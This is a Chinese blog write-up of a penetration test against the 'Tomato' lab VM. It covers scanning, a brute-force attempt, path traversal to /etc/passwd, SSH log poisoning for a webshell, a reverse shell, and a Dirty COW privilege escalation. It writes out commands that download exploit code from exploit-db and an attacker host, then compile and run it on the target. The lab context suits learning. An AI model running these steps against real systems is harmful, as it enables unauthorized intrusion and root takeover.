---
link: https://blog.csdn.net/2403_88102829/article/details/156229134
title: tomato渗透报告
description: 文章浏览阅读466次，点赞25次，收藏11次。一：环境：攻击机：kali：192.168.145.128靶机：tomato：192.168.145.182工具：二：渗透过程arp-scan -l扫一下，发现疑似靶机 ip 192.168.145.182简单扫一下，观察开放端口，确定该ip是攻击目标注意：这个命令后面对应的SERVE只是对应nmap内部的服务映射表，并不一定是攻击目标的端口服务所以我们再侵略性扫一下看回显，分析一下得到的信息：目标为Linux，内核版本号是3.2-4.9。
keywords: 网络
author: Le_ee 博客等级 码龄1年
date: 2026-01-28T07:32:27.482Z
categories:
  - 靶场复现
tags:
  - Tomato靶场
  - Linux
  - 渗透测试
publisher: null
stats: paragraph=80 sentences=76, words=149
---

<meta name="referrer" content="no-referrer"/>

一：环境：

攻击机：kali：192.168.145.128

靶机：tomato：192.168.145.182

工具：

二：渗透过程

arp-scan -l扫一下，发现疑似靶机 ip 192.168.145.182

![](https://i-blog.csdnimg.cn/direct/8679af6422c5491eb7cb7ce7ca9b71b4.png)简单扫一下，观察开放端口，确定该ip是攻击目标

![](https://i-blog.csdnimg.cn/direct/7e2b7087a6e54fa1b2a64294975864f8.png)

注意：这个命令后面对应的SERVE只是对应nmap内部的服务映射表，并不一定是攻击目标的端口服务

所以我们再侵略性扫一下

![](https://i-blog.csdnimg.cn/direct/d6f1ecd293474221956a579d565eeaf0.png)

看回显，分析一下得到的信息：

目标为Linux，内核版本号是3.2-4.9

22端口——对应ftp（文件传输协议），可以尝试匿名登录

80与8888端口——对应http协议，一个apache一个linux

2211端口——对应ssh远程连接协议

先尝试一下ftp匿名登录

```
ftp 192.168.145.182
```

这里我尝试了annoymous,tomato,admin几个常见的name，包括hydra爆破前1000个名字都以失败告终

![](https://i-blog.csdnimg.cn/direct/f733979ed2604a329c92c8e07021f7ec.png)

换方法，去火狐里尝试走http

80出来一个large tomato

![](https://i-blog.csdnimg.cn/direct/6277610d3d00435b9a72fdd984c40267.png)

88出现一个登录页面

![](https://i-blog.csdnimg.cn/direct/0dcd7aae02d6408584547a0e4c7d9eea.png)

感觉都无法利用，于是dirb扫一下目录，看有没有可以用的子url

![](https://i-blog.csdnimg.cn/direct/b43dc57a57414863b8018b14f97f3810.png)

发现3个，依次访问一下，第一个发现信息回显，第二个还是large tomato，第三个403(服务器理解请求，但拒绝授权——权限不足)

第一个链接是返回父目录链接

第二个是文件夹，我们点开看看

![](https://i-blog.csdnimg.cn/direct/b195ce9a144d47829c64bfb5717e096e.png)

![](https://i-blog.csdnimg.cn/direct/64e4b5d578cc4afcb43b43c43ee92c13.png)

info.php ← 显示PHP/服务器信息

phpinfo.php ← 同上

debug.php ← 调试功能，可能有敏感输出

点进去看，的确回显了php信息，查看一下页面源码，源码提示我们存在一个文件包含漏洞(很像动态一句话木马)，并且include里面通过get传参

ps：服务器会把我们包含的任何文件作为php代码执行，如果包含有效的代码，执行并返回结果，如果不是php代码，就直接回显文件内容

![](https://i-blog.csdnimg.cn/direct/8bd0007075e440c591f9d4f834b9e7c6.png)

再确定一下：

在url后面令?image=../../../../../etc/passwd（注意：../从3个到6个递增尝试看是否有回显）

成功得到了有tomato的用户名列表：表示一个普通用户 tomato，UID=1000，有 bash 登录权限

ps：这里可以看到后面还有两个sshd和ftp用户，都是服务账户，无法登录

所以我们现在确定了有文件包含漏洞，并且得到了我们下一步攻击要用的用户名——tomato

![](https://i-blog.csdnimg.cn/direct/9f4b57d199de4d9e9b22fca5444825b3.png)

梳理一下攻击流程：我们现在已经能用文件包含漏洞有限访问一些配置文件了，下一步尝试用这个漏洞完全操控靶机

也就是尝试获得一个shell，进而用python语句形成交互型shell

也就是上传木马，通过url查看/var/log/auth.log文件，发现有回显，所以我们可以产生通过报错把木马写入日志文件里

![](https://i-blog.csdnimg.cn/direct/dc11882dac1a4cbf8a3d7b5f4b4fd564.png)

尝试远程连接报错

回到kali靶机，通过2211端口ssh一句话木马

![](https://i-blog.csdnimg.cn/direct/e627f13eb39849f690698cbcda78e81a.png)

去我们主机的powershell看一眼具体报错，报的是引用变量的错

![](https://i-blog.csdnimg.cn/direct/774dfc9efd314b70a2f06ace44b60300.png)

刷新日志看看有没有写进去

换种方法：使用 -l 参数指定用户名

#### ssh -l ' ' 192.168.145.182 -p 2211

成功了

![](https://i-blog.csdnimg.cn/direct/2e6a4e4ed46645029d724e28c13912f1.png)

随便输点密码，刷新日志，看到报错回显![](https://i-blog.csdnimg.cn/direct/b1d0e81442e442a09c6c09e6783adbae.png)

蚁剑连一下日志试试

连接成功

![](https://i-blog.csdnimg.cn/direct/41fb92feae304d028c958b279e74aea2.png)

添加后打开虚拟终端，分析回显

* 内核： `4.4.0-21-generic`（2016年Ubuntu）
* 用户： `www-data`（低权限）
* 已知用户： `tomato`（UID 1000）![](https://i-blog.csdnimg.cn/direct/340e1328aba24afcaa7e7d7f2c519914.png)

所以下一步就是建立稳定的反弹shell，和提权

反弹shell的建立：

现在kali里面随便找个每用的端口开开，我开了1234

* **`nc`**：netcat 工具
* **`-l`**：监听模式（listen）
* **`-v`**：详细输出（verbose），显示连接信息
* **`-n`**：不进行 DNS 解析，直接使用 IP
* **`-p 1234`**：指定监听端口为 1234

![](https://i-blog.csdnimg.cn/direct/e1048bb02dff4d4ebef5b72248a8978c.png)

bash反弹：

![](https://i-blog.csdnimg.cn/direct/38c848b304664e799bb3bfd9be0f3c24.png)

连接成功

![](https://i-blog.csdnimg.cn/direct/13957e90b55d4d8aaea147dd92a9fd2d.png)

```
继续到tmp目录
cd /tmp
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh
./les.sh
```

看开头爆出来的几个CVE漏洞，我们尝试第一个脏牛

![](https://i-blog.csdnimg.cn/direct/f952931802724b2ea0180803b4a091d8.png)

执行试试

# Kali下载编译（用不同exp）
cd /tmp
wget https://www.exploit-db.com/download/40616 -O dirty_simple.c
gcc dirty_simple.c -o dirty_simple -static -pthread -lcrypt
python3 -m http.server 8081

# 目标机
cd /tmp
wget http://192.168.145.128:8081/dirty_simple
chmod +x dirty_simple
./dirty_simple

提权成功![](https://i-blog.csdnimg.cn/direct/aab45ca55edc45ef8106e6bbdced7ab1.png)
